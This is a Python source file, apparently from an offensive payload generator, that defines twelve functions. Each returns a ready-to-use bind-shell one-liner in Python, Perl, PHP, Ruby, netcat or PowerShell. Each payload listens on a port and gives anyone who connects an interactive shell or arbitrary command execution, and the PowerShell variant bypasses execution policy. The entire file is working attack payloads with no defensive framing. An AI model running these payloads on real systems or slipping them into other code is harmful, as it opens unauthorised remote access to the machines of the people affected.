#!/usr/bin/env python

# Bind TCP shells

def BIND_PYTHON_TCP():
	return """python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])" """

def BIND_PYTHON_UDP():
	return """python -c 'while 1: from subprocess import Popen,PIPE;from socket import socket, AF_INET, SOCK_DGRAM;s=socket(AF_INET,SOCK_DGRAM);s.bind(("0.0.0.0",PORT));data,addr=s.recvfrom(8096);out=Popen(data,shell=True,stdout=PIPE,stderr=PIPE).communicate();s.sendto("".join([out[0],out[1]]),addr)'"""

def BIND_PERL_TCP():
	return """perl -e 'use Socket;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'"""

def BIND_PERL_UDP():
	return """perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(LocalPort => "PORT",Proto => "udp");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'"""

def BIND_PHP_TCP():
	return """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",PORT);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""

def BIND_PHP_UDP():
	return """php -r '$s=socket_create(AF_INET, SOCK_DGRAM, 0);socket_bind($s,"0.0.0.0",PORT);while(1){ socket_recvfrom($s, $buf, 1024, 0, $remote_ip, $remote_port);$d=shell_exec($buf);socket_sendto($s,$d,1024,0,$remote_ip,$remote_port);}'"""

def BIND_RUBY_TCP():
	return """ruby -rsocket -e 'f=TCPServer.new(PORT);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'"""

def BIND_RUBY_UDP():
	return """ruby -rsocket -e 'require "open3";s=UDPSocket.new;s.bind("0.0.0.0",PORT);loop do d,a=s.recvfrom(1024);out,err,st=Open3.capture3(d);s.send(out,0,a[3],a[1]); end'"""

def BIND_NETCAT_TCP():
	return """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/f"""

def BIND_NETCAT_TRADITIONAL_TCP():
	return """nc -lvp PORT -c /bin/bash"""

def BIND_NETCAT_OPENBSD_UDP():
	return """coproc nc -luvp PORT; exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""

def BIND_POWERSHELL_TCP():
	return """powershell.exe -nop -ep bypass -Command '$port=PORT;$listener=[System.Net.Sockets.TcpListener]$port;$listener.Start();$client = $listener.AcceptTCPClient();$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $returndata = ([text.encoding]::ASCII).GetString($bytes, 0, $i); try { $result = (Invoke-Expression -command $returndata 2>&1 | Out-String ) } catch { Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; }; $sendback = $result +  \\"PS \\" + (Get-Location).Path + \\"> \\"; $x = ($error[0] | Out-String); $error.clear(); $sendback = $sendback + $x; $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback); $stream.Write($sendbytes, 0, $sendbytes.Length); $stream.Flush();}; $client.Close(); if ($listener) { $listener.Stop(); };'"""
